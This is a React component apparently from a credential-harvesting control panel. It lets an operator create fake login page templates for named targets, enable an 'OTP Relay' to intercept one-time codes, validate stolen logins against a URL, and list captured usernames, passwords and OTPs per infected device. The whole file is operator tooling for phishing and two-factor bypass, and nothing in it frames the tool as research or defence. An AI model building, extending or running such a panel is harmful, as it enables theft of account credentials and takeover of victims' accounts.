import React, { useState, useEffect, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { apiFetch } from '../api/client.js';

const C = {
  surface2: '#10121f',
  surface3: '#141728',
  border: 'rgba(255,255,255,0.05)',
  borderMd: 'rgba(255,255,255,0.09)',
  borderHi: 'rgba(59,130,246,0.32)',
  text: '#c9d1e8',
  text2: '#4e5a70',
  accent: '#3b82f6',
  accentBg: 'rgba(59,130,246,0.09)',
  green: '#22c55e',
  greenBg: 'rgba(34,197,94,0.09)',
  amber: '#f59e0b',
  red: '#ef4444',
  mono: "ui-monospace,'Cascadia Code','Fira Code','JetBrains Mono',monospace",
  sans: "-apple-system,BlinkMacSystemFont,'Inter',system-ui,sans-serif",
};

const BLANK_CONFIG = { target_name: '', login_html: '', validation_url: '', otp_enabled: false };

const fieldStyle = {
  width: '100%', padding: '7px 10px', borderRadius: 6,
  border: `1px solid ${C.borderMd}`, background: C.surface2,
  color: C.text, fontSize: 13, outline: 'none', display: 'block', boxSizing: 'border-box',
};

const labelStyle = {
  display: 'block', fontSize: 10, fontWeight: 700,
  letterSpacing: '0.09em', textTransform: 'uppercase',
  color: C.text2, marginBottom: 6, marginTop: 12,
};

export default function HarvestManager() {
  const [tab, setTab] = useState('templates');
  const [configs, setConfigs] = useState([]);
  const [selected, setSelected] = useState(null);
  const [form, setForm] = useState(BLANK_CONFIG);
  const [creds, setCreds] = useState([]);
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState('');
  const [deleting, setDeleting] = useState(null);

  const loadConfigs = useCallback(() =>
    apiFetch('/api/harvest/configs').then(setConfigs).catch(() => {}), []);

  const loadCreds = useCallback(() =>
    apiFetch('/api/harvest/credentials').then(setCreds).catch(() => {}), []);

  useEffect(() => { loadConfigs(); loadCreds(); }, [loadConfigs, loadCreds]);

  async function deleteCred(id) {
    if (deleting) return;
    setDeleting(id);
    try {
      await apiFetch(`/api/harvest/credentials/${id}`, { method: 'DELETE' });
      setCreds(prev => prev.filter(c => c.id !== id));
    } catch { /* ignore */ }
    setDeleting(null);
  }

  async function selectConfig(cfg) {
    const full = await apiFetch(`/api/harvest/configs/${cfg.id}`);
    setSelected(full);
    setForm({ ...full });
  }

  function newConfig() {
    setSelected(null);
    setForm(BLANK_CONFIG);
  }

  async function save() {
    setSaving(true); setMsg('');
    try {
      if (selected) {
        await apiFetch(`/api/harvest/configs/${selected.id}`, {
          method: 'PUT', body: JSON.stringify(form),
        });
        setMsg('ok:Saved');
      } else {
        const r = await apiFetch('/api/harvest/configs', {
          method: 'POST', body: JSON.stringify(form),
        });
        setMsg(`ok:Created #${r.id}`);
        setSelected(r);
      }
      await loadConfigs();
    } catch (e) {
      setMsg(`err:${e.message}`);
    } finally {
      setSaving(false);
    }
  }

  const TAB = { templates: 'Templates', editor: 'Editor', credentials: 'Credentials' };

  return (
    <motion.div
      initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.15 }}
      style={{ fontFamily: C.sans, color: C.text }}
    >
      <div style={{ marginBottom: 20 }}>
        <h1 style={{ fontSize: 20, fontWeight: 700, margin: 0 }}>Harvest Manager</h1>
        <div style={{ fontSize: 12, color: C.text2, marginTop: 4 }}>
          {configs.length} templates - {creds.length} credentials
        </div>
      </div>

      {/* Tabs */}
      <div style={{ display: 'flex', gap: 6, marginBottom: 20 }}>
        {Object.entries(TAB).map(([key, label]) => (
          <button key={key} onClick={() => setTab(key)} style={{
            height: 28, padding: '0 14px', borderRadius: 5,
            border: tab === key ? 'none' : `1px solid ${C.borderMd}`,
            cursor: 'pointer',
            background: tab === key ? C.accent : 'transparent',
            color: tab === key ? '#fff' : C.text2,
            fontSize: 12, fontWeight: tab === key ? 600 : 500,
          }}>
            {label}
          </button>
        ))}
      </div>

      {/* Templates grid */}
      {tab === 'templates' && (
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(240px, 1fr))', gap: 12 }}>
          <div
            onClick={newConfig}
            style={{
              background: 'transparent', borderRadius: 8, padding: 18,
              border: `2px dashed ${C.borderMd}`,
              cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
              minHeight: 90, color: C.text2, fontSize: 13,
            }}
          >
            + New Template
          </div>
          {configs.map(cfg => (
            <div key={cfg.id}
              onClick={() => { selectConfig(cfg); setTab('editor'); }}
              style={{
                background: C.surface3, borderRadius: 8, padding: 18,
                border: selected?.id === cfg.id ? `1px solid ${C.borderHi}` : `1px solid ${C.borderMd}`,
                cursor: 'pointer',
              }}
            >
              <div style={{ fontWeight: 600, fontSize: 13, color: C.text }}>{cfg.target_name}</div>
              <div style={{ fontSize: 11, color: C.text2, marginTop: 6 }}>
                {cfg.otp_enabled ? 'OTP - ' : ''}
                {cfg.validation_url ? 'Validation enabled' : 'No validation'}
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Editor */}
      {tab === 'editor' && (
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
          <div style={{
            background: C.surface3, borderRadius: 8, padding: '14px 16px',
            border: `1px solid ${C.borderMd}`,
          }}>
            <div style={{
              fontSize: 10, fontWeight: 700, letterSpacing: '0.09em', textTransform: 'uppercase',
              color: C.text2, marginBottom: 10,
            }}>
              {selected ? `Edit: ${selected.target_name}` : 'New Template'}
            </div>

            <label style={labelStyle}>Target Name</label>
            <input value={form.target_name}
              onChange={e => setForm(f => ({ ...f, target_name: e.target.value }))}
              placeholder="Example Corp Login" style={fieldStyle} />

            <label style={labelStyle}>Validation URL (optional)</label>
            <input value={form.validation_url || ''}
              onChange={e => setForm(f => ({ ...f, validation_url: e.target.value }))}
              placeholder="https://..." style={fieldStyle} dir="ltr" />

            <label style={labelStyle}>OTP</label>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginTop: 6 }}>
              <input type="checkbox" id="otp" checked={form.otp_enabled}
                onChange={e => setForm(f => ({ ...f, otp_enabled: e.target.checked }))} />
              <label htmlFor="otp" style={{ fontSize: 12, color: C.text }}>Enable OTP Relay</label>
            </div>

            <label style={labelStyle}>Login HTML</label>
            <textarea value={form.login_html || ''}
              onChange={e => setForm(f => ({ ...f, login_html: e.target.value }))}
              rows={12} placeholder="<div>...</div>"
              style={{ ...fieldStyle, resize: 'vertical', fontFamily: C.mono, fontSize: 12 }} dir="ltr" />

            <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginTop: 14 }}>
              <button onClick={save} disabled={saving} style={{
                height: 30, padding: '0 12px', borderRadius: 6, border: 'none',
                background: saving ? 'transparent' : C.green,
                border: saving ? `1px solid ${C.borderMd}` : 'none',
                color: saving ? C.text2 : '#fff',
                fontSize: 12, fontWeight: 600, cursor: saving ? 'default' : 'pointer',
                opacity: saving ? 0.5 : 1,
              }}>
                {saving ? 'Saving...' : 'Save'}
              </button>
              {msg && (
                <span style={{
                  fontSize: 12,
                  color: msg.startsWith('ok:') ? C.green : C.red,
                }}>
                  {msg.startsWith('ok:') ? msg.slice(3) : msg.startsWith('err:') ? msg.slice(4) : msg}
                </span>
              )}
            </div>
          </div>

          {/* iframe preview */}
          <div style={{
            background: C.surface3, borderRadius: 8, padding: '14px 16px',
            border: `1px solid ${C.borderMd}`,
          }}>
            <div style={{
              fontSize: 10, fontWeight: 700, letterSpacing: '0.09em', textTransform: 'uppercase',
              color: C.text2, marginBottom: 12,
            }}>
              Preview
            </div>
            <div style={{
              border: `1px solid ${C.borderMd}`, borderRadius: 6, overflow: 'hidden',
              background: '#000', height: 480,
            }}>
              <iframe
                srcDoc={form.login_html || `<div style="color:#4e5a70;padding:20px;font-family:sans-serif;font-size:13px">HTML will appear here</div>`}
                style={{ width: '100%', height: '100%', border: 'none' }}
                sandbox="allow-scripts"
                title="harvest preview"
              />
            </div>
          </div>
        </div>
      )}

      {/* Credentials table */}
      {tab === 'credentials' && (
        <div>
          {creds.length === 0 ? (
            <div style={{ color: C.text2, padding: 20, fontSize: 12 }}>No credentials yet</div>
          ) : (
            <div style={{ overflowX: 'auto' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 12 }}>
                <thead>
                  <tr style={{ borderBottom: `1px solid ${C.borderMd}` }}>
                    {['#', 'Device', 'Username', 'Password', 'OTP', 'Valid', 'Time', ''].map(h => (
                      <th key={h} style={{
                        padding: '8px 12px', fontSize: 10, fontWeight: 700,
                        letterSpacing: '0.09em', textTransform: 'uppercase',
                        color: C.text2, textAlign: 'left',
                      }}>
                        {h}
                      </th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  <AnimatePresence>
                    {creds.map(c => (
                      <motion.tr key={c.id}
                        initial={{ opacity: 0 }} animate={{ opacity: 1 }}
                        style={{ borderBottom: `1px solid ${C.border}` }}
                      >
                        <td style={{ padding: '8px 12px', color: C.text2 }}>{c.id}</td>
                        <td style={{ padding: '8px 12px', color: C.text }}>{c.device_name || `#${c.device_id}`}</td>
                        <td style={{ padding: '8px 12px', fontFamily: C.mono, color: C.text }}>{c.username}</td>
                        <td style={{ padding: '8px 12px', fontFamily: C.mono, color: C.amber }}>{c.password}</td>
                        <td style={{ padding: '8px 12px', fontFamily: C.mono, color: C.text }}>{c.otp || '-'}</td>
                        <td style={{ padding: '8px 12px' }}>
                          <span style={{ color: c.validated ? C.green : C.text2, fontSize: 13 }}>
                            {c.validated ? '+' : 'o'}
                          </span>
                        </td>
                        <td style={{ padding: '8px 12px', color: C.text2, fontFamily: C.mono }}>
                          {c.timestamp ? new Date(c.timestamp).toLocaleString('en-US') : '-'}
                        </td>
                        <td style={{ padding: '8px 12px' }}>
                          <button
                            onClick={() => deleteCred(c.id)}
                            disabled={deleting === c.id}
                            style={{
                              background: 'none', border: `1px solid ${C.red}`,
                              color: C.red, borderRadius: 4, padding: '2px 8px',
                              fontSize: 11, cursor: 'pointer', opacity: deleting === c.id ? 0.4 : 1,
                            }}
                          >
                            {deleting === c.id ? '…' : 'del'}
                          </button>
                        </td>
                      </motion.tr>
                    ))}
                  </AnimatePresence>
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}
    </motion.div>
  );
}
